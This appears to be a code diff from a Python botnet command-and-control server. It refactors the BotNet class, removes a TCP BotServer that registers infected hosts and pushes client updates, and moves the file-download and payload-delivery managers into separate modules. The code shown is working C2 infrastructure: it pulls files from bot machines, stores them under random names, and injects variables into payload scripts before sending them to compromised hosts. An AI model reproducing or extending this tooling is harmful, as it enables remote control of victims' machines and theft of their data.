@@ -1,24 +1,20 @@
-import importlib
-from distutils.version import LooseVersion
 import json
-import pickle
 from threading import Thread, Condition
 from threading import Lock
 import select
 import base64
-import uuid
-import os
-import sys
 
 try:
     from server import formatsock, server
     from server.client import client
+    from server.botfilemanager import BotNetFileManager
+    from server.botpayloadmanager import BotNetPayloadManager
 except:
     import formatsock
     import server
     from client import client
-
-MIN_CLIENT_VERSION = client.__version__
+    from botfilemanager import BotNetFileManager
+    from botpayloadmanager import BotNetPayloadManager
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
@@ -179,7 +175,8 @@ class BotNet(Thread):
     def startFileDownload(self, user, filename):
         with self.connlock:
             if user in self.allConnections:
-                self.allConnections[user].startFileDownload(filename)
+                if not self.filemanager.fileIsDownloading(user,filename):
+                    self.allConnections[user].startFileDownload(filename)
                 return True
             return None
 
@@ -213,34 +210,6 @@ class BotNet(Thread):
     def deleteFile(self, user, filename):
         return self.filemanager.deleteFile(user,filename)
 
-
-class BotServer(Thread):
-    def __init__(self, tcpsock, botnet, socketio):
-        Thread.__init__(self)
-        self.tcpsock = tcpsock
-        self.botnet = botnet
-        self.socketio = socketio
-        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)
-
-    def run(self):
-        while True:
-            self.tcpsock.listen(5)
-            (clientsock, (ip, port)) = self.tcpsock.accept()
-            clientformatsock = formatsock.FormatSocket(clientsock)
-            msgbytes = clientformatsock.recv()
-            host_info = json.loads(msgbytes.decode('UTF-8'))
-
-            user = host_info['user'].strip()
-            botversion = LooseVersion(host_info['version'])
-            bot = Bot(clientsock, host_info, self.socketio)
-            if botversion < self.clientversion:
-                # Autoupdate
-                print("[*] Updating {} on version {}".format(user, botversion))
-                bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
-            else:
-                print("[+] Received connection from {}".format(user))
-                self.botnet.addConnection(user, bot)
-                self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
 class Bot:
     FILE_SHARD_SIZE = 4096
@@ -320,163 +289,3 @@ class Bot:
         with self.botlock:
             json_str = json.dumps({Bot.LS_JSON: filename})
             self.sock.send(json_str)
-
-class BotNetFileManager:
-    FILENAME_OBJFILE = 'filenames.json'
-
-    # TODO: change to separate locks for each file
-    def __init__(self,outputdir):
-        '''
-        Contains internal json object, doesn't need to update file for current bytes,
-        only for names, close, and maxbytes
-        :param outputdir: directory for storing downloads
-        '''
-        self.fileobjs = {}
-        self.filedets = {}
-        self.lock = Lock()
-        self.outputdir = outputdir
-        self.filenamefile = os.path.join(outputdir,BotNetFileManager.FILENAME_OBJFILE)
-        if os.path.exists(self.filenamefile):
-            with open(self.filenamefile,"rb") as jsonfile:
-                self.filedets = pickle.load(jsonfile)
-                for uf in list(self.filedets.keys()):
-                    filepath = self.filedets[uf][0]
-                    if not os.path.exists(filepath):
-                        self.filedets.pop(uf)
-            with open(self.filenamefile, "wb") as jsonfile:
-                pickle.dump(self.filedets, jsonfile)
-
-    def appendBytesToFile(self, user, filename, wbytes):
-        uf = (user, filename)
-        with self.lock:
-            if uf not in self.fileobjs:
-                filename = str(uuid.uuid4())
-                self.fileobjs[uf] = open(os.path.join(self.outputdir, filename), "wb")
-                self.filedets[uf] = [filename,0,0]
-                with open(self.filenamefile,"wb") as jsonfile:
-                    pickle.dump(self.filedets, jsonfile)
-            if not self.fileobjs[uf].closed:
-                self.fileobjs[uf].write(wbytes)
-                self.filedets[uf][1] += len(wbytes)
-
-    def closeFile(self, user, filename):
-        uf = (user, filename)
-        with self.lock:
-            if not self.fileobjs[uf].closed:
-                self.fileobjs[uf].close()
-            self.fileobjs.pop(uf)
-            with open(self.filenamefile, "wb") as jsonfile:
-                pickle.dump(self.filedets, jsonfile)
-
-    def setFileSize(self, user, filename, filesize):
-        uf = (user, filename)
-        with self.lock:
-            if uf not in self.fileobjs:
-                filename = os.path.join(self.outputdir, str(uuid.uuid4()))
-                self.fileobjs[uf] = open(filename, "wb")
-                self.filedets[uf] = [filename, 0, filesize]
-            else:
-                self.filedets[uf][2] = filesize
-            with open(self.filenamefile, "wb") as jsonfile:
-                pickle.dump(self.filedets, jsonfile)
-
-    def getFilesAndInfo(self):
-        '''
-        Creates a list of fileinfo objects with {user, filename, size, downloaded}
-        :return:
-        '''
-        # Get (user,file) list
-        with self.lock:
-            ufilenames = self.filedets.keys()
-
-            fileinfo = []
-            for key in ufilenames:
-                (user, filename) = key
-                uuidname, downloaded, size = self.filedets[key]
-                fileinfo.append(dict(user=user,filename=filename,size=size,downloaded=downloaded))
-            return fileinfo
-
-    def getFileName(self, user, filename):
-        uf = (user, filename)
-        with self.lock:
-            if uf in self.filedets:
-                return self.filedets[uf][0]
-            else:
-                return None
-
-    def deleteFile(self, user, filename):
-        uf = (user, filename)
-        with self.lock:
-            if uf in self.filedets:
-                if uf in self.fileobjs:
-                    self.fileobjs[uf].close()
-                real_filename = self.filedets[uf][0]
-                self.filedets.pop(uf)
-                os.remove(real_filename)
-                with open(self.filenamefile, "wb") as jsonfile:
-                    pickle.dump(self.filedets, jsonfile)
-                return True
-            return False
-
-class BotNetPayloadManager:
-    PAYLOAD_EXT = '.py'
-    COMMENT_DELIMIT = ['"""',"'''"]
-    VAR_DENOTE = 'VAR'
-
-    def __init__(self, payloadpath):
-        self.payloaddescriptions = {}
-        self.payloadfiles = {}
-        self.payloadpath = payloadpath
-        for root, dirs, files in os.walk(self.payloadpath):
-            for file in files:
-                if file.endswith(BotNetPayloadManager.PAYLOAD_EXT):
-                    filepath = os.path.join(root, file)
-                    name, desc = self.parsePayload(filepath)
-                    self.payloaddescriptions[name] = desc
-                    self.payloadfiles[name] = filepath
-
-    def getPayloads(self):
-        return self.payloaddescriptions
-
-    def getPayloadNames(self):
-        return [payload for payload in self.payloaddescriptions.keys()]
-
-    def parsePayload(self,payloadpath):
-        with open(payloadpath,"r") as f:
-            payloadlines = f.readlines()
-        payloaddict = dict(name=payloadpath[len(self.payloadpath)+1:-len(BotNetPayloadManager.PAYLOAD_EXT)],
-                           description='',
-                           vars={})
-        try:
-            if payloadlines[0].strip() in BotNetPayloadManager.COMMENT_DELIMIT:
-                for i in range(1,len(payloadlines)):
-                    payloadline = payloadlines[i]
-
-                    if payloadline in BotNetPayloadManager.COMMENT_DELIMIT:
-                        break
-                    elif ':' in payloadline:
-                        indx = payloadline.index(':')
-                        lhs, rhs = payloadline[:indx].strip(), payloadline[indx+1:].strip()
-                        if lhs.startswith(BotNetPayloadManager.VAR_DENOTE):
-                            var = lhs[len(BotNetPayloadManager.VAR_DENOTE):].strip()
-                            payloaddict['vars'][var] = rhs
-                        else:
-                            payloaddict[lhs.lower()] = rhs
-        except Exception as e:
-            sys.stderr.write("[!] Error parsing {}: {}\n".format(payloadpath,str(e)))
-            sys.stderr.flush()
-        return payloaddict['name'], payloaddict
-
-    def getPayloadText(self, payload, args):
-        if payload not in self.payloaddescriptions:
-            return None
-        vars = self.payloaddescriptions[payload]['vars']
-        vartext = ""
-        for reqvar in vars.keys():
-            if reqvar in args:
-                vartext += '{}="{}"\n'.format(reqvar,args[reqvar])
-            else:
-                return None
-        with open(self.payloadfiles[payload],"r") as f:
-            payloadtext = f.read()
-            return vartext+payloadtext
